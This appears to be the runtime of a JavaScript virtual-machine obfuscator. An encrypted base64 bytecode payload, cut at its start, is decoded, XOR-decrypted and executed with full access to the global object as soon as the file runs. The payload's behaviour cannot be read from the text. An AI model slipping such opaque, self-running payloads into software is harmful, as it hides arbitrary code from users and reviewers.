YRN0AWxodGdhIiQrMyxnYS4hOXJhYWU/Y3ZwezZtNW9mcS1keD0lMy5cBzVofQ/k15igyR9rF3dBRl1cUVEJZ7jXjgcGtdKhfx0ecQ7FtWUBB7e2tdelFcTGoTU04QAF5qHRXz1KZX9/HLjQtzk4ODgzpcVnRik8IB09UzZhfD0hIyFsaHRnYSIkKzMsZ2EuITlyYWFlP3JwdnAsKClsaG4aaUckKzMsZ2EuITlycHIxJHh4IWxodGdhIiQrMyxnYS4hOXJnZSZuG3cbN3ltc3ghbGh0Z2EiJCszLGdhLiE5cmFmPixtaWglIj9tLHomIBArC2JibnU0L2ghbGh0Z2EiKyA6LnRwLmBuMXJgOz52cygIDU5LGTNuTnNTAS5pIWxodGdhV1toJykeFGcuCFVrZSpROx1JTk5hcm8mKn5ySGhFdCoweG9+Ym4meWNzBHlhBh0qFEdoCFRqZCtQAS5pIWxodGdhLk0sQCxnYS4kPTYwJSIlLDpsaHRnYSIkKzMsZ2EuITlyYWFlP2N2cGwPJh1vZnEtZHg9JTNvcwhWaH0PlKf8BwbFotF/HR5xDuiIgYBIwMALCwsmzcbD0/16H3QDdHAVG31pCQgYHGwUdQNmdXERJ0QHQ0cHATECUydVPFJmEhB8YgZgYggVVVtIVXtXW18t7oDhBAWG4ZF/HR7onP4tLA6eny8ugBEBERG4nRmzEho4DQal1tB5W7TAYGhI0NYGAaLX1MzKYmMGpqekwsTk5PQCA4YXBZbl4MDAyCornQwGlfibZQN0cBVzahvz8vnhdRt4eLjMpFdWnp9ZyM9XVp6eiB6Pho+cqjydlJTBx9fX0aSnZxNlHQCwsbK7mPHw9SwO39zZCQ7m5OSBh5eXkeTnZxNlHR6e6pHpGegJAJACEZGTlRcGhfXzo6CmxMd7H3QDdHAVq824AAHZ2QjZ3cUUxSQgNQUFA2tru7qpERDLytolSUFKSmUm3dbCy+S/ur602R90A3RwFavNtg4P1wLi4/ISEfr76jrR2wsKMtoL2t7GFMUkIDYGBuWMimJiYgIAKCw/NEZvHx/PzqbGFscmIDUFBeaCh7e3sTQ15pWQgICFJybe3yn4/ycm3t37E/Py9BQG5ZaQoKCg2dkJJ0lCVl4uQGD0/aGrnYiJiYmJkJCQkYUpLBATYwx8bO+e9pYWlwYAFQUFlvL35+fhFBWW5eDQ0NUnJo6PKaivJyYICio5qaCkFAaV5uDw8PCi4mFraEgn4unhsf4wNn4tzcag5Gfm4ODnZhN9Hh7onP4tLLIjLi4ugBEBERG4s0HrSkJODQal1tB5Y5LmRk5W0ACAgYcnJqXMymJjZq6vpMLEBBaF4ucXBZbl4MDAyCornQwGlfibZQN0HBwUah18Z9+hp75l1AQAFQUF1r+6qqq5ERDb2so6kJ6OjdEfdAN0aGioqaYOD8fEG9rKEhHKy9o60dsbGiLKC8rO1hTVBAAWBgbVvLpiYgMLCSksPzRGCXxsr9621hbXBgAVBQXWsrenp6EUFdaloJCQlScmzs/g4ecnJs7N6zjp4OQUBtWmoLCwsOKCQUtIaDiHjIQ0BRkYIPDjQDdYMgEBYWWHtbAABdaZ6VQ3UW0YpcanNTThMDXWscF/HR6I/J5tb5yUhU9P';
//end preprocessor
(function(){

	var bootPayload = [];
	{
		let chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
		let str = String(pl).replace(/[=]+$/, '');
	    let tmp = 0;
	    for (let bc = 0, bs, buffer, idx = 0; buffer = str.charAt(idx++);~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer,bc++ % 4) ? (tmp = (255 & bs >> (-2 * bc & 6)), bootPayload.push(tmp), tmp) : 0) {
	    	buffer = chars.indexOf(buffer);
	    }
	}

	class Context {
		constructor(global, payload, registers, variables) {
			this.g = global;
			this.p = payload;
			this.r = registers || [];
			if(registers == null) {
				this.r[2] = undefined;
				this.r[1] = [{h: 0, t: global, f: null}];
				this.r[0] = 0;
			}
			this.v = variables || {};
			this.s = 0;
			this.d = 0;
			this.f = 0;
			this.t = [];
		}
	}
	let v = {g: this};
	v.g.ct = Context;

	let globalContext = new Context(glob, bootPayload, null, v);

	function decrypt(ctx, i) {
	  let si = (i / 40) | 0;
	  let sd = i - si * 40;
	  if(sd < ctx.d || ctx.f != si || ctx.d >= 40) {
	    ctx.d = 0;
	    ctx.f = si;
	    ctx.s = 0;
	    ctx.t = [];
	  }
	  let decResult = 0;
		if(i < 0) throw 'this is a dummy throw to fix a babel-minify bug';
	  for(; ctx.d <= sd; ctx.d++) {
	    decResult = ctx.p[ctx.d + (si * 40)] ^ ctx.s;
	    ctx.t.push(decResult);
	    if(ctx.d < 4) {
	      ctx.s ^= ctx.t[ctx.d];
	    }else {
	      ctx.s ^= ctx.t.splice(0, 1)[0] ^ ctx.t[ctx.t.length - 1];
	    }
	  }
	  return decResult;
	}
	v.g.d = decrypt;

	function readVarInt(ctx, i) {
	    let output = 0;
	    let v2 = 0;
	    let v3 = 0;
	    do {
	        v3 = decrypt(ctx, v2 + i);
	        output |= (v3 & 127) << (v2++ * 7);
	        if(v2 > 5) return {o: output, c: v2};
	    }while((v3 & 128) == 128);
	    return {o: output, c: v2};
	}
	v.g.rvi = readVarInt;

	let lastDecodePos = 0;

	function safeZero() {
		return 0;
	}
	v.g.sz = safeZero;

	function safeArray() {
		return [];
	}
	v.g.sa = safeArray;

	function nextReadLocation(ctx) {
		let depth = 0;
		let reg = safeZero() << 4;
		if(reg != 0) throw 'this is a dummy throw to fix a babel-minify bug';
		while(depth++ < 127 && reg & 7 == 1) {
			reg = ctx.r[reg >> 4];
		}
		if(reg & 7 == 1) {
			throw "Circular pointer";
		}
		if(reg & 0b00000111 != 0) {
			throw "Unexpected constant";
		}
		return reg;
	}
	v.g.nr = nextReadLocation;

	function decodeByte(ctx) {
		let reg = nextReadLocation(ctx);
		let r = Math.round(ctx.r[reg >> 4]);
		if(r >= ctx.p.length || r < 0) {
			return -1;
		}
		ctx.r[reg >> 4] = r + 1;
		lastDecodePos = r;
		return decrypt(ctx, r);
	}
	v.g.db = decodeByte;

	function decode(ctx) {
		let reg = nextReadLocation(ctx);
		let r = Math.round(ctx.r[reg >> 4]);
		if(r >= ctx.p.length || r < 0) {
			return -1;
		}
		let ret = readVarInt(ctx, r);
		ctx.r[reg >> 4] = r + ret.c;
		lastDecodePos = r;
		return ret.o;
	}
	v.g.dg = decode;

	function readRegister(ctx) {
		return decode(ctx) >> 4;
	}
	v.g.dr = readRegister;

	function readArg(ctx) {
		let b = decode(ctx);
		if(b < 0) throw 'this is a dummy throw to fix a babel-minify bug';
		let depth = 0;
		while(depth++ < 127 && b & 7 == 1) {
			b = ctx.r[b >> 4];
		}
		if(b & 7 == 1) {
			throw "Circular register pointer";
		}
		if(b === 2) {
			let buf = new ArrayBuffer(8);
			let u8 = new Uint8Array(buf);
			u8[7] = decodeByte(ctx);
			u8[6] = decodeByte(ctx);
			u8[5] = decodeByte(ctx);
			u8[4] = decodeByte(ctx);
			u8[3] = decodeByte(ctx);
			u8[2] = decodeByte(ctx);
			u8[1] = decodeByte(ctx);
			u8[0] = decodeByte(ctx);
			let f64 = new Float64Array(buf);
			return f64[0];
		}else if(b === 3) {
			let strc = safeArray();
			if(strc.length != 0) throw 'this is a dummy throw to fix a babel-minify bug';
			for(let i = 0; (i = decodeByte(ctx)) != 0;) {
				strc.push(String.fromCharCode(i));
			}
			return strc.join('');
		}else if(b === 4) {
			return true;
		}else if(b === 5) {
			return false;
		}else if(b === 6) {
			return null;
		}else if(b === 7) {
			return undefined;
		}else if(b === 8) {
			let b = decodeByte(ctx);
			return b > 127 ? b -= 256 : b;
		}else if(b === 9) {
			let b = decodeByte(ctx) << 8 | decodeByte(ctx);
			return b > 32767 ? b -= 65536 : b;
		}else if(b === 10) {
			let b = decodeByte(ctx) << 16 | decodeByte(ctx) << 8 | decodeByte(ctx);
			return b > 8388607 ? b -= 16777216 : b;
		}else if(b === 11) {
			let b = decodeByte(ctx) << 24 | decodeByte(ctx) << 16 | decodeByte(ctx) << 8 | decodeByte(ctx);
			return b > 2147483647 ? b -= 4294967296 : b;
		}
		return ctx.r[b >> 4];
	}
	v.g.da = readArg;

	let lastInstruction = 0;
	function readInstruction(ctx) {
		let r = decode(ctx);
		lastInstruction = lastDecodePos;
		if(r < 0) return null;
		if(r >= instructions.length) {
			throw "Invalid instruction, ISN# " + r;
		}
		return instructions[r];
	}
	v.g.di = readInstruction;

	function writeArg(ctx, value) {
		ctx.r[readRegister(ctx)] = value;
	}
	v.g.qa = writeArg;

	let instructions = []
	//arithmatic
	//add
	if(INS_add)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) + readArg(ctx));
		});
	//sub
	if(INS_sub)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) - readArg(ctx));
		});
	//mul
	if(INS_mul)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) * readArg(ctx));
		});
	//div
	if(INS_div)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) / readArg(ctx));
		});
	//mod
	if(INS_mod)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) % readArg(ctx));
		});

	//boolean arithmatic
	//or
	if(INS_or)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) || readArg(ctx));
		});
	//and
	if(INS_and)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) && readArg(ctx));
		});
	//not
	if(INS_not)
		instructions.push(function(ctx) {
			writeArg(ctx, !readArg(ctx));
		});

	//bit arithmatic
	//shr
	if(INS_shr)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) >> readArg(ctx));
		});
	//shl
	if(INS_shl)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) << readArg(ctx));
		});
	//shrz
	if(INS_shrz)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) >>> readArg(ctx));
		});
	//bit_or
	if(INS_bit_or)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) | readArg(ctx));
		});
	//bit_and
	if(INS_bit_and)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) & readArg(ctx));
		});
	//bit_xor
	if(INS_bit_xor)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) ^ readArg(ctx));
		});
	//bit_not
	if(INS_bit_not)
		instructions.push(function(ctx) {
			writeArg(ctx, ~readArg(ctx));
		});

	//register management
	//mov
	if(INS_mov)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx));
		});
	//xchg
	if(INS_xchg)
		instructions.push(function(ctx) {
			let r1 = readRegister(ctx);
			let r2 = readRegister(ctx);
			let v1 = ctx.r[r1];
			ctx.r[r1] = ctx.r[r2];
			ctx.r[r2] = v1;
		});

	//JS interface
	//global
	if(INS_global)
		instructions.push(function(ctx) {
			writeArg(ctx, ctx.g);
		});
	//getprop
	if(INS_getprop)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx)[readArg(ctx)]);
		});
	//setprop
	if(INS_setprop)
		instructions.push(function(ctx) {
			readArg(ctx)[readArg(ctx)] = readArg(ctx);
		});
	//in
	if(INS_in)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) in readArg(ctx));
		});
	//delete
	if(INS_delete)
		instructions.push(function(ctx) {
			delete readArg(ctx)[readArg(ctx)];
		});
	//instanceof
	if(INS_instanceof)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) instanceof readArg(ctx));
		});
	//typeof
	if(INS_typeof)
		instructions.push(function(ctx) {
			writeArg(ctx, typeof readArg(ctx));
		});
	//call_0
	if(INS_call_0)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, []));
		});
	//call_1
	if(INS_call_1)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx)]));
		});
	//call_2
	if(INS_call_2)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx)]));
		});
	//call_3
	if(INS_call_3)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_4
	if(INS_call_4)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_5
	if(INS_call_5)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_6
	if(INS_call_6)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_7
	if(INS_call_7)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_8
	if(INS_call_8)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_9
	if(INS_call_9)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//call_10
	if(INS_call_10)
		instructions.push(function(ctx) {
			let th = readArg(ctx);
			writeArg(ctx, readArg(ctx).apply(th, [readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx), readArg(ctx)]));
		});
	//obj
	if(INS_obj)
		instructions.push(function(ctx) {
			writeArg(ctx, {});
		});
	//arr
	if(INS_arr)
		instructions.push(function(ctx) {
			writeArg(ctx, []);
		});
	//null
	if(INS_null)
		instructions.push(function(ctx) {
			writeArg(ctx, null);
		});
	//undefined
	if(INS_undefined)
		instructions.push(function(ctx) {
			writeArg(ctx, undefined);
		});
	//regex
	if(INS_regex)
		instructions.push(function(ctx) {
			writeArg(ctx, new RegExp(readArg(ctx), readArg(ctx)));
		});
	//true
	if(INS_true)
		instructions.push(function(ctx) {
			writeArg(ctx, true);
		});
	//false
	if(INS_false)
		instructions.push(function(ctx) {
			writeArg(ctx, false);
		});
	//protokeys
	if(INS_protokeys)
		instructions.push(function(ctx) {
			let obj = readArg(ctx);
			let ret = [];
			for(let x in obj) {
				ret.push(x);
			}
			writeArg(ctx, ret);
		});

	//comparison
	//eq
	if(INS_eq)
		instructions.push(function(ctx) {
			let a1 = readArg(ctx);
			let a2 = readArg(ctx);
			writeArg(ctx, a1 == a2 || ((a1 == undefined || a2 == undefined) && (a1 == 0 || a2 == 0)));
		});
	//eq_typed
	if(INS_eq_typed)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) === readArg(ctx));
		});
	//neq
	if(INS_neq)
		instructions.push(function(ctx) {
			let a1 = readArg(ctx);
			let a2 = readArg(ctx);
			writeArg(ctx, a1 != a2 && !((a1 == undefined || a2 == undefined) && (a1 == 0 || a2 == 0)));
		});
	//neq_typed
	if(INS_neq_typed)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) !== readArg(ctx));
		});
	//le
	if(INS_le)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) < readArg(ctx));
		});
	//gr
	if(INS_gr)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) > readArg(ctx));
		});
	//leeq
	if(INS_leeq)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) <= readArg(ctx));
		});
	//greq
	if(INS_greq)
		instructions.push(function(ctx) {
			writeArg(ctx, readArg(ctx) >= readArg(ctx));
		});

	//branching
	//jmp
	if(INS_jmp)
		instructions.push(function(ctx) {
			ctx.r[0] = readArg(ctx);
		});
	//jz
	if(INS_jz)
		instructions.push(function(ctx) {
			let a = readArg(ctx);
			if(a == 0 || a == undefined) {
				ctx.r[0] = readArg(ctx);
			}else{
				readArg(ctx);
			}
		});
	//jnz
	if(INS_jnz)
		instructions.push(function(ctx) {
			let a = readArg(ctx);
			if(a != 0 && a != undefined) {
				ctx.r[0] = readArg(ctx);
			}else{
				readArg(ctx);
			}
		});

	//variables
	//setvar
	if(INS_setvar)
		instructions.push(function(ctx) {
			ctx.v[readArg(ctx)] = readArg(ctx);
		});
	//getvar
	if(INS_getvar)
		instructions.push(function(ctx) {
			writeArg(ctx, ctx.v[readArg(ctx)]);
		});

	//VM interface
	//context
	if(INS_context)
		instructions.push(function(ctx) {
			writeArg(ctx, ctx);
		});

	//debugging
	//report
	if(INS_report)
		instructions.push(function(ctx) {
			console.log('reported:', readArg(ctx));
		});
	//dump
	if(INS_dump)
		instructions.push(function(ctx) {
			for(let i = 0; i < ctx.r.length; i++) {
				console.log(i + ':', readArg(ctx));
			}
		});

	//obfuscation related
	//nop
	if(INS_nop)
		instructions.push(function(ctx) {

		});
	if(INS_obf_pushx) // incapable of being properly assembled at this time, used to obfuscate
		instructions.push(function(ctx) {
			let c = readArg(ctx);
			let b = [];
			for(let i = 0; i < c; i++) {
				b.push(readArg(ctx));
			}
			writeArg(ctx, b);
		});
	v.g.is = instructions;

	function runContext(ctx) {
		let ins = null;
		try{
			while((ins = readInstruction(ctx)) != null) {
				ins(ctx);
			}
		}catch(e) {
			console.log(e, 'LOC: ' + lastInstruction)
		}
	}
	v.g.rc = runContext;
	runContext(globalContext);
}).call({});
